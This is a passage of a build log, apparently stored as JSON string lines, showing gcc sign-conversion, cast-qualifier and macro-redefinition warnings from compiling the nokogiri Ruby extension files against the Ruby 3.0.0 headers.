            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from nokogiri.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘RB_INT2FIX’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:88:29: warning: conversion to ‘long unsigned int’ from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "   88 |     const unsigned long j = i;\n",
            "      |                             ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:90:29: warning: conversion to ‘long int’ from ‘long unsigned int’ may change the sign of the result [-Wsign-conversion]\n",
            "   90 |     const long          l = k;\n",
            "      |                             ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:92:29: warning: conversion to ‘VALUE’ {aka ‘const long unsigned int’} from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "   92 |     const VALUE         n = m;\n",
            "      |                             ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rbimpl_fix2long_by_idiv’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:123:28: warning: conversion to ‘long int’ from ‘VALUE’ {aka ‘long unsigned int’} may change the sign of the result [-Wsign-conversion]\n",
            "  123 |     const SIGNED_VALUE y = x - RUBY_FIXNUM_FLAG;\n",
            "      |                            ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rbimpl_fix2long_by_shift’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:140:28: warning: conversion to ‘long int’ from ‘VALUE’ {aka ‘long unsigned int’} may change the sign of the result [-Wsign-conversion]\n",
            "  140 |     const SIGNED_VALUE y = x;\n",
            "      |                            ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rb_fix2ulong’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:175:12: warning: conversion to ‘long unsigned int’ from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "  175 |     return rb_fix2long(x);\n",
            "      |            ^~~~~~~~~~~~~~\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rb_ulong2num_inline’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:214:28: warning: conversion to ‘long int’ from ‘long unsigned int’ may change the sign of the result [-Wsign-conversion]\n",
            "  214 |         return RB_LONG2FIX(v);\n",
            "      |                            ^\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/arithmetic.h:36,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:25,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from nokogiri.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/st_data_t.h: In function ‘RB_ST2FIX’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/st_data_t.h:45:22: warning: conversion to ‘long int’ from ‘st_data_t’ {aka ‘long unsigned int’} may change the sign of the result [-Wsign-conversion]\n",
            "   45 |     SIGNED_VALUE x = i;\n",
            "      |                      ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/st_data_t.h:56:24: warning: conversion to ‘long int’ from ‘long unsigned int’ may change the sign of the result [-Wsign-conversion]\n",
            "   56 |     return RB_LONG2FIX(y);\n",
            "      |                        ^\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/assume.h:29,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/backward/2/assume.h:24,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/defines.h:72,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from nokogiri.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/core/rarray.h: In function ‘RARRAY_PTR’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/core/rarray.h:249:24: warning: cast discards ‘const’ qualifier from pointer target type [-Wcast-qual]\n",
            "  249 |     return RBIMPL_CAST((VALUE *)RARRAY_CONST_PTR(tmp));\n",
            "      |                        ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/cast.h:33:29: note: in definition of macro ‘RBIMPL_CAST’\n",
            "   33 | # define RBIMPL_CAST(expr) (expr)\n",
            "      |                             ^~~~\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/ruby.h:39,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from nokogiri.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/memory.h: In function ‘rb_alloc_tmp_buffer2’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/memory.h:253:56: warning: conversion to ‘size_t’ {aka ‘long unsigned int’} from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "  253 |     const size_t total_size = rbimpl_size_mul_or_raise(count, elsize);\n",
            "      |                                                        ^~~~~\n",
            "In file included from nokogiri.c:1:\n",
            "./nokogiri.h: At top level:\n",
            "./nokogiri.h:43: warning: \"MAYBE_UNUSED\" redefined\n",
            "   43 | #  define MAYBE_UNUSED(name) name __attribute__((unused))\n",
            "      | \n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/config.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:15,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from nokogiri.c:1:\n",
            "/usr/include/x86_64-linux-gnu/ruby-3.0.0/ruby/config.h:159: note: this is the location of the previous definition\n",
            "  159 | #define MAYBE_UNUSED(x) __attribute__ ((__unused__)) x\n",
            "      | \n",
            "compiling xml_attr.c\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:42,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/int.h:26,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/char.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:25,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./xml_attr.h:4,\n",
            "                 from xml_attr.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/special_consts.h: In function ‘RB_TEST’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/special_consts.h:121:16: warning: unsigned conversion from ‘int’ to ‘VALUE’ {aka ‘long unsigned int’} changes value from ‘-9’ to ‘18446744073709551607’ [-Wsign-conversion]\n",
            "  121 |     return obj & ~RUBY_Qnil;\n",
            "      |                ^\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/int.h:26,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/char.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:25,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./xml_attr.h:4,\n",
            "                 from xml_attr.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘RB_INT2FIX’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:88:29: warning: conversion to ‘long unsigned int’ from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "   88 |     const unsigned long j = i;\n",
            "      |                             ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:90:29: warning: conversion to ‘long int’ from ‘long unsigned int’ may change the sign of the result [-Wsign-conversion]\n",
            "   90 |     const long          l = k;\n",
            "      |                             ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:92:29: warning: conversion to ‘VALUE’ {aka ‘const long unsigned int’} from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "   92 |     const VALUE         n = m;\n",
            "      |                             ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rbimpl_fix2long_by_idiv’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:123:28: warning: conversion to ‘long int’ from ‘VALUE’ {aka ‘long unsigned int’} may change the sign of the result [-Wsign-conversion]\n",
            "  123 |     const SIGNED_VALUE y = x - RUBY_FIXNUM_FLAG;\n",
            "      |                            ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rbimpl_fix2long_by_shift’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:140:28: warning: conversion to ‘long int’ from ‘VALUE’ {aka ‘long unsigned int’} may change the sign of the result [-Wsign-conversion]\n",
            "  140 |     const SIGNED_VALUE y = x;\n",
            "      |                            ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rb_fix2ulong’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:175:12: warning: conversion to ‘long unsigned int’ from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "  175 |     return rb_fix2long(x);\n",
            "      |            ^~~~~~~~~~~~~~\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rb_ulong2num_inline’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:214:28: warning: conversion to ‘long int’ from ‘long unsigned int’ may change the sign of the result [-Wsign-conversion]\n",
            "  214 |         return RB_LONG2FIX(v);\n",
            "      |                            ^\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/arithmetic.h:36,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:25,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./xml_attr.h:4,\n",
            "                 from xml_attr.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/st_data_t.h: In function ‘RB_ST2FIX’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/st_data_t.h:45:22: warning: conversion to ‘long int’ from ‘st_data_t’ {aka ‘long unsigned int’} may change the sign of the result [-Wsign-conversion]\n",
            "   45 |     SIGNED_VALUE x = i;\n",
            "      |                      ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/st_data_t.h:56:24: warning: conversion to ‘long int’ from ‘long unsigned int’ may change the sign of the result [-Wsign-conversion]\n",
            "   56 |     return RB_LONG2FIX(y);\n",
            "      |                        ^\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/assume.h:29,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/backward/2/assume.h:24,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/defines.h:72,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./xml_attr.h:4,\n",
            "                 from xml_attr.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/core/rarray.h: In function ‘RARRAY_PTR’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/core/rarray.h:249:24: warning: cast discards ‘const’ qualifier from pointer target type [-Wcast-qual]\n",
            "  249 |     return RBIMPL_CAST((VALUE *)RARRAY_CONST_PTR(tmp));\n",
            "      |                        ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/cast.h:33:29: note: in definition of macro ‘RBIMPL_CAST’\n",
            "   33 | # define RBIMPL_CAST(expr) (expr)\n",
            "      |                             ^~~~\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/ruby.h:39,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./xml_attr.h:4,\n",
            "                 from xml_attr.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/memory.h: In function ‘rb_alloc_tmp_buffer2’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/memory.h:253:56: warning: conversion to ‘size_t’ {aka ‘long unsigned int’} from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "  253 |     const size_t total_size = rbimpl_size_mul_or_raise(count, elsize);\n",
            "      |                                                        ^~~~~\n",
            "In file included from ./xml_attr.h:4,\n",
            "                 from xml_attr.c:1:\n",
            "./nokogiri.h: At top level:\n",
            "./nokogiri.h:43: warning: \"MAYBE_UNUSED\" redefined\n",
            "   43 | #  define MAYBE_UNUSED(name) name __attribute__((unused))\n",
            "      | \n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/config.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:15,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./xml_attr.h:4,\n",
            "                 from xml_attr.c:1:\n",
            "/usr/include/x86_64-linux-gnu/ruby-3.0.0/ruby/config.h:159: note: this is the location of the previous definition\n",
            "  159 | #define MAYBE_UNUSED(x) __attribute__ ((__unused__)) x\n",
            "      | \n",
            "In file included from /usr/include/ruby-3.0.0/ruby/ruby.h:44,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./xml_attr.h:4,\n",
            "                 from xml_attr.c:1:\n",
            "xml_attr.c: In function ‘new’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/scan_args.h:247:62: warning: cast discards ‘const’ qualifier from pointer target type [-Wcast-qual]\n",
            "  247 |                      (rb_scan_args_verify(fmt, varc), vars), (char *)fmt, varc)\n",
            "      |                                                              ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/scan_args.h:365:9: note: in expansion of macro ‘rb_scan_args0’\n",
            "  365 |         rb_scan_args0(                                        \\\n",
            "      |         ^~~~~~~~~~~~~\n",
            "xml_attr.c:58:3: note: in expansion of macro ‘rb_scan_args’\n",
            "   58 |   rb_scan_args(argc, argv, \"2*\", &document, &name, &rest);\n",
            "      |   ^~~~~~~~~~~~\n",
            "compiling xml_attribute_decl.c\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:42,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/int.h:26,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/char.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:25,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./xml_attribute_decl.h:4,\n",
            "                 from xml_attribute_decl.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/special_consts.h: In function ‘RB_TEST’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/special_consts.h:121:16: warning: unsigned conversion from ‘int’ to ‘VALUE’ {aka ‘long unsigned int’} changes value from ‘-9’ to ‘18446744073709551607’ [-Wsign-conversion]\n",
            "  121 |     return obj & ~RUBY_Qnil;\n",
            "      |                ^\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/int.h:26,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/char.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:25,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./xml_attribute_decl.h:4,\n",
            "                 from xml_attribute_decl.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘RB_INT2FIX’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:88:29: warning: conversion to ‘long unsigned int’ from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "   88 |     const unsigned long j = i;\n",
            "      |                             ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:90:29: warning: conversion to ‘long int’ from ‘long unsigned int’ may change the sign of the result [-Wsign-conversion]\n",
            "   90 |     const long          l = k;\n",
            "      |                             ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:92:29: warning: conversion to ‘VALUE’ {aka ‘const long unsigned int’} from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "   92 |     const VALUE         n = m;\n",
            "      |                             ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rbimpl_fix2long_by_idiv’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:123:28: warning: conversion to ‘long int’ from ‘VALUE’ {aka ‘long unsigned int’} may change the sign of the result [-Wsign-conversion]\n",
            "  123 |     const SIGNED_VALUE y = x - RUBY_FIXNUM_FLAG;\n",
            "      |                            ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rbimpl_fix2long_by_shift’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:140:28: warning: conversion to ‘long int’ from ‘VALUE’ {aka ‘long unsigned int’} may change the sign of the result [-Wsign-conversion]\n",
            "  140 |     const SIGNED_VALUE y = x;\n",
            "      |                            ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rb_fix2ulong’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:175:12: warning: conversion to ‘long unsigned int’ from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "  175 |     return rb_fix2long(x);\n",
            "      |            ^~~~~~~~~~~~~~\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rb_ulong2num_inline’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:214:28: warning: conversion to ‘long int’ from ‘long unsigned int’ may change the sign of the result [-Wsign-conversion]\n",
            "  214 |         return RB_LONG2FIX(v);\n",
            "      |                            ^\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/arithmetic.h:36,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:25,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./xml_attribute_decl.h:4,\n",
            "                 from xml_attribute_decl.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/st_data_t.h: In function ‘RB_ST2FIX’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/st_data_t.h:45:22: warning: conversion to ‘long int’ from ‘st_data_t’ {aka ‘long unsigned int’} may change the sign of the result [-Wsign-conversion]\n",
            "   45 |     SIGNED_VALUE x = i;\n",
            "      |                      ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/st_data_t.h:56:24: warning: conversion to ‘long int’ from ‘long unsigned int’ may change the sign of the result [-Wsign-conversion]\n",
            "   56 |     return RB_LONG2FIX(y);\n",
            "      |                        ^\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/assume.h:29,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/backward/2/assume.h:24,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/defines.h:72,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./xml_attribute_decl.h:4,\n",
            "                 from xml_attribute_decl.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/core/rarray.h: In function ‘RARRAY_PTR’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/core/rarray.h:249:24: warning: cast discards ‘const’ qualifier from pointer target type [-Wcast-qual]\n",
            "  249 |     return RBIMPL_CAST((VALUE *)RARRAY_CONST_PTR(tmp));\n",
            "      |                        ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/cast.h:33:29: note: in definition of macro ‘RBIMPL_CAST’\n",
            "   33 | # define RBIMPL_CAST(expr) (expr)\n",
            "      |                             ^~~~\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/ruby.h:39,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./xml_attribute_decl.h:4,\n",
            "                 from xml_attribute_decl.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/memory.h: In function ‘rb_alloc_tmp_buffer2’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/memory.h:253:56: warning: conversion to ‘size_t’ {aka ‘long unsigned int’} from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "  253 |     const size_t total_size = rbimpl_size_mul_or_raise(count, elsize);\n",
            "      |                                                        ^~~~~\n",
            "In file included from ./xml_attribute_decl.h:4,\n",
            "                 from xml_attribute_decl.c:1:\n",
            "./nokogiri.h: At top level:\n",
            "./nokogiri.h:43: warning: \"MAYBE_UNUSED\" redefined\n",
            "   43 | #  define MAYBE_UNUSED(name) name __attribute__((unused))\n",
            "      | \n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/config.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:15,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./xml_attribute_decl.h:4,\n",
            "                 from xml_attribute_decl.c:1:\n",
            "/usr/include/x86_64-linux-gnu/ruby-3.0.0/ruby/config.h:159: note: this is the location of the previous definition\n",
            "  159 | #define MAYBE_UNUSED(x) __attribute__ ((__unused__)) x\n",
            "      | \n",
            "xml_attribute_decl.c: In function ‘attribute_type’:\n",
            "xml_attribute_decl.c:13:18: warning: conversion to ‘int’ from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "   13 |   return INT2NUM((long)node->atype);\n",
            "      |                  ^~~~~~~~~~~~~~~~~\n",
            "compiling xml_cdata.c\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:42,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/int.h:26,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/char.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:25,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./xml_cdata.h:4,\n",
            "                 from xml_cdata.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/special_consts.h: In function ‘RB_TEST’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/special_consts.h:121:16: warning: unsigned conversion from ‘int’ to ‘VALUE’ {aka ‘long unsigned int’} changes value from ‘-9’ to ‘18446744073709551607’ [-Wsign-conversion]\n",
            "  121 |     return obj & ~RUBY_Qnil;\n",
            "      |                ^\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/int.h:26,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/char.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:25,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./xml_cdata.h:4,\n",
            "                 from xml_cdata.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘RB_INT2FIX’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:88:29: warning: conversion to ‘long unsigned int’ from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "   88 |     const unsigned long j = i;\n",
            "      |                             ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:90:29: warning: conversion to ‘long int’ from ‘long unsigned int’ may change the sign of the result [-Wsign-conversion]\n",
            "   90 |     const long          l = k;\n",
            "      |                             ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:92:29: warning: conversion to ‘VALUE’ {aka ‘const long unsigned int’} from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "   92 |     const VALUE         n = m;\n",
            "      |                             ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rbimpl_fix2long_by_idiv’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:123:28: warning: conversion to ‘long int’ from ‘VALUE’ {aka ‘long unsigned int’} may change the sign of the result [-Wsign-conversion]\n",
            "  123 |     const SIGNED_VALUE y = x - RUBY_FIXNUM_FLAG;\n",
            "      |                            ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rbimpl_fix2long_by_shift’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:140:28: warning: conversion to ‘long int’ from ‘VALUE’ {aka ‘long unsigned int’} may change the sign of the result [-Wsign-conversion]\n",
            "  140 |     const SIGNED_VALUE y = x;\n",
            "      |                            ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rb_fix2ulong’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:175:12: warning: conversion to ‘long unsigned int’ from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "  175 |     return rb_fix2long(x);\n",
            "      |            ^~~~~~~~~~~~~~\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rb_ulong2num_inline’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:214:28: warning: conversion to ‘long int’ from ‘long unsigned int’ may change the sign of the result [-Wsign-conversion]\n",
            "  214 |         return RB_LONG2FIX(v);\n",
            "      |                            ^\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/arithmetic.h:36,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:25,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./xml_cdata.h:4,\n",
            "                 from xml_cdata.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/st_data_t.h: In function ‘RB_ST2FIX’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/st_data_t.h:45:22: warning: conversion to ‘long int’ from ‘st_data_t’ {aka ‘long unsigned int’} may change the sign of the result [-Wsign-conversion]\n",
            "   45 |     SIGNED_VALUE x = i;\n",
            "      |                      ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/st_data_t.h:56:24: warning: conversion to ‘long int’ from ‘long unsigned int’ may change the sign of the result [-Wsign-conversion]\n",
            "   56 |     return RB_LONG2FIX(y);\n",
            "      |                        ^\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/assume.h:29,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/backward/2/assume.h:24,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/defines.h:72,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./xml_cdata.h:4,\n",
            "                 from xml_cdata.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/core/rarray.h: In function ‘RARRAY_PTR’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/core/rarray.h:249:24: warning: cast discards ‘const’ qualifier from pointer target type [-Wcast-qual]\n",
            "  249 |     return RBIMPL_CAST((VALUE *)RARRAY_CONST_PTR(tmp));\n",
            "      |                        ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/cast.h:33:29: note: in definition of macro ‘RBIMPL_CAST’\n",
            "   33 | # define RBIMPL_CAST(expr) (expr)\n",
            "      |                             ^~~~\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/ruby.h:39,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./xml_cdata.h:4,\n",
            "                 from xml_cdata.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/memory.h: In function ‘rb_alloc_tmp_buffer2’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/memory.h:253:56: warning: conversion to ‘size_t’ {aka ‘long unsigned int’} from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "  253 |     const size_t total_size = rbimpl_size_mul_or_raise(count, elsize);\n",
            "      |                                                        ^~~~~\n",
            "In file included from ./xml_cdata.h:4,\n",
            "                 from xml_cdata.c:1:\n",
            "./nokogiri.h: At top level:\n",
            "./nokogiri.h:43: warning: \"MAYBE_UNUSED\" redefined\n",
            "   43 | #  define MAYBE_UNUSED(name) name __attribute__((unused))\n",
            "      | \n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/config.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:15,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./xml_cdata.h:4,\n",
